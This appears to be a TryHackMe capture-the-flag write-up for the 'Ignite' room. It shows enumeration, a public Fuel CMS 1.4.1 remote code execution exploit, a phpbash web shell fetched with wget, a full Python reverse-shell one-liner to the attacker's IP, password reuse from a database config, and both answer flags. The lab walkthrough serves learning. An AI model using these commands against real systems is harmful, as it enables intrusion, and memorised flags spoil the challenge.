## Ignite - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/ignite)

**Root it!**

<i>Root the box! Designed and created by DarkStar7471, built by Paradox.</i>

<i>Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.</i>

**IP: 10.10.30.6**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Feroxbuster

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Firstly, I do Nmap and Feroxbuster for enumeration.
  ```
  nmap -A -p- 10.10.30.6 -> only 80 open, Apache httpd 2.4.18 ((Ubuntu))
  ```

  ```
  feroxbuster -u http://10.10.30.6/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

  [#>------------------] - 13m    67755/964214  3h      found:33      errors:57845  
  [#>------------------] - 13m     7697/87650   10/s    http://10.10.30.6/ 
  [#>------------------] - 13m     8094/87650   11/s    http://10.10.30.6/fuel/ 
  [#>------------------] - 13m     6802/87650   9/s     http://10.10.30.6/fuel/modules/ 
  [#>------------------] - 13m     6985/87650   9/s     http://10.10.30.6/assets/ 
  [#>------------------] - 13m     5474/87650   7/s     http://10.10.30.6/assets/images/ 
  [#>------------------] - 13m     5464/87650   7/s     http://10.10.30.6/assets/docs/ 
  [#>------------------] - 13m     5354/87650   7/s     http://10.10.30.6/assets/pdf/ 
  [#>------------------] - 13m     5831/87650   8/s     http://10.10.30.6/assets/css/ 
  [#>------------------] - 12m     5304/87650   7/s     http://10.10.30.6/assets/js/ 
  [#>------------------] - 12m     5273/87650   7/s     http://10.10.30.6/fuel/licenses/ 
  [#>------------------] - 12m     5339/87650   7/s     http://10.10.30.6/assets/cache/ 
  ```
  
- I also ran `nikto` but it only found `robots.txt` so yeah...

---

## ⚙️ Shell Access

- So I searched `fuel cms exploit` and found it immediately for version 1.4.1. Download the exploit and comment `proxy`, also delete `proxies=proxy` since you don't need proxy at all.<br>
[fuel CMS 1.4.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47138)

- To gain shell, simply use the exploit with python2. I saved mine exploit as `fuel_cms_exploit.py`, when you download it from `Exploits-DB` it will be saved as `47138.py`
  
  ```python2 fuel_cms_exploit.py```
  
- Perfect! I have shell but it's printing whole response after each command, so I started looking for a resolution to remove those responses.

- I found that `phpbash.php` will do exactly what I need, here's the link, download `.php` file to your Kali machine and then transfer it to the target machine.<br>
  [phpbash](https://github.com/Arrexel/phpbash/blob/master/phpbash.php)
  
  ```
  python3 -m http.server 80 -> my machine
  wget http://[YOUR-THM-IP]:80/phpbash.php -> target machine
  ```

- When it's done, go to: http://10.10.30.6/phpbash.php and you will have interactive shell! Pretty cool right? Now let's find some flags shall we!

---

## 🧍 User Privilege Escalation

- OK, getting user flag is always easy, just go through target system and you will find it. It's in the `/home/www-data/` directory.
  ```
  cat /home/www-data/flag.txt
  6470e394cbf6dab6a91682cc8585059b
  ```
  
- First one done, moving to escalation to get root flag.

---

## 👑 Root Privilege Escalation

- This one wasn't that hard to find. First thing what I did was to get shell on my actual terminal since it is easier for me to work there. Start a `netcat` listener and connect it with target machine.
  ```
  my machine -> nc -lvnp 7777
  target machine -> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR-THM-IP]",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
  
- Ok, awesome, I have shell in my terminal, let's change it to `putty`
  ```
  python -c 'import pty; pty.spawn("/bin/bash")'
  ctrl+Z -> backgrounds shell
  stty raw -echo;fg
  ```
  
- Now let's get root, when I did `sudo -l` it asked me for password and I also enumerated all writable files on machine
  ```
  find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

  144391 388 -rwsr-xr-- 1 root dip 394984 Jun 12 2018 /usr/sbin/pppd
  265987 20 -rwsr-xr-x 1 root root 18664 Mar 17 2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
  139989 16 -rwsr-xr-x 1 root root 14864 Jan 15 2019 /usr/lib/policykit-1/polkit-agent-helper-1
  142068 100 -rwsr-sr-x 1 root root 98440 Jan 29 2019 /usr/lib/snapd/snap-confine
  134963 44 -rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  144205 12 -rwsr-sr-x 1 root root 10584 Oct 25 2018 /usr/lib/xorg/Xorg.wrap
  139780 420 -rwsr-xr-x 1 root root 428240 Jan 31 2019 /usr/lib/openssh/ssh-keysign
  135261 12 -rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device
  130720 40 -rwsr-xr-x 1 root root 40432 May 16 2017 /usr/bin/chsh
  131038 76 -rwsr-xr-x 1 root root 75304 May 16 2017 /usr/bin/gpasswd
  131440 40 -rwsr-xr-x 1 root root 39904 May 16 2017 /usr/bin/newgrp
  131613 24 -rwsr-xr-x 1 root root 23376 Jan 15 2019 /usr/bin/pkexec
  139620 12 -rwsr-xr-x 1 root root 10624 May 8 2018 /usr/bin/vmware-user-suid-wrapper
  131991 136 -rwsr-xr-x 1 root root 136808 Jul 4 2017 /usr/bin/sudo
  130718 52 -rwsr-xr-x 1 root root 49584 May 16 2017 /usr/bin/chfn
  131503 56 -rwsr-xr-x 1 root root 54256 May 16 2017 /usr/bin/passwd
  783517 40 -rwsr-xr-x 1 root root 40128 May 16 2017 /bin/su
  783491 44 -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6
  783465 140 -rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g
  783490 44 -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping
  783453 40 -rwsr-xr-x 1 root root 40152 May 16 2018 /bin/mount
  783537 28 -rwsr-xr-x 1 root root 27608 May 16 2018 /bin/umount
  783416 32 -rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount
  ```

- So, I did more enumeration in order to get root's password but couldn't do it, then I remembered that I saw database configuration somewhere on targets web page. When I visited database page I found the location of database!
  ```
  cat fuel/application/config/database.php  
  db['default'] = array(
          'dsn'   => '',
          'hostname' => 'localhost',
          'username' => 'root',
          'password' => 'mememe',
          'database' => 'fuel_schema',
          'dbdriver' => 'mysqli',
          'dbprefix' => '',
          'pconnect' => FALSE,
          'db_debug' => (ENVIRONMENT !== 'production'),
          'cache_on' => FALSE,
          'cachedir' => '',
          'char_set' => 'utf8',
          'dbcollat' => 'utf8_general_ci',
          'swap_pre' => '',
          'encrypt' => FALSE,
          'compress' => FALSE,
          'stricton' => FALSE,
          'failover' => array(),
          'save_queries' => TRUE
  );
  ```

- Perfect! That's it! Now I have root's password which is `mememe`, just need to get the flag now.
  ```
  su root
  mememe
  
  cat /root/root.txt
  b9bbcb33e11b80be759c4e844862482d 
  ```

---

## 🏁 Flags

- **User Flag**: `6470e394cbf6dab6a91682cc8585059b`
- **Root Flag**: `b9bbcb33e11b80be759c4e844862482d`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding root's password since I knew that I saw database configuration somewhere but couldn't remember where...`

- What did I learn?
  `Nothing new besides using phpbash.php which was cool tho.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
